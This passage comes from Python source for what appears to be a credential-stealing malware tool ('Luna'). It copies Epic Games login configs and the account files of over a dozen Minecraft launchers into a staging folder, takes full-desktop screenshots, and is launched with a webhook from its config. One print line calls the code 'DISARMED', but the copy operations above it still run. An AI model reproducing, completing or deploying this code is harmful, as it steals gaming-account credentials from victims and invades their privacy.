        self.StealMinecraft()
        print("[DEBUG] Games finished")
    def GetLnkFromStartMenu(self, app: str) -> list[str]:
        shortcutPaths = []
        startMenuPaths = [os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'), os.path.join('C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs')]
        for startMenuPath in startMenuPaths:
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == '%s.lnk' % app.lower():
                        shortcutPaths.append(os.path.join(root, file))
        return shortcutPaths
    def StealEpic(self) -> None:
        found = False
        if True:
            saveToPath = os.path.join(temp_path, 'Games', 'Epic')
            epicPath = os.path.join(os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if '[RememberMe]' in contents:
                        try:
                            os.makedirs(saveToPath, exist_ok=True)
                            for file in os.listdir(epicPath):
                                if os.path.isfile(os.path.join(epicPath, file)):
                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                                    found = True
                            print(f"[DISARMED] Would have copied Epic Games config files from {epicPath} to {saveToPath}")
                        except Exception:
                            pass
        if not found:
            print("[DEBUG] Games: No Epic Games config files found.")
    def StealMinecraft(self) -> None:
        found = False
        saveToPath = os.path.join(temp_path, 'Games', 'Minecraft')
        userProfile = os.getenv('userprofile')
        roaming = os.getenv('appdata')
        minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.feather', 'accounts.json'), 'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'), 'Novoline': os.path.join(roaming, '.minectaft', 'Novoline', 'alts.novo'), 'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'), 'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'), 'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'), 'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'), 'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
        for name, path in minecraftPaths.items():
            if os.path.isfile(path):
                try:
                    os.makedirs(os.path.join(saveToPath, name), exist_ok=True)
                    shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                    found = True
                except Exception:
                    continue
        if not found:
            print("[DEBUG] Games: No Minecraft accounts/configs found.")

class Screenshot:
    def __init__(self):
        self.take_screenshot()
    def take_screenshot(self):
        image = ImageGrab.grab(bbox=None, all_screens=True, include_layered_windows=False, xdisplay=None)
        image.save(temp_path + '\\desktopshot.png')
        image.close()

if __name__ == "__main__":
    Luna(__CONFIG__['webhook'])
    main(__CONFIG__['webhook'])
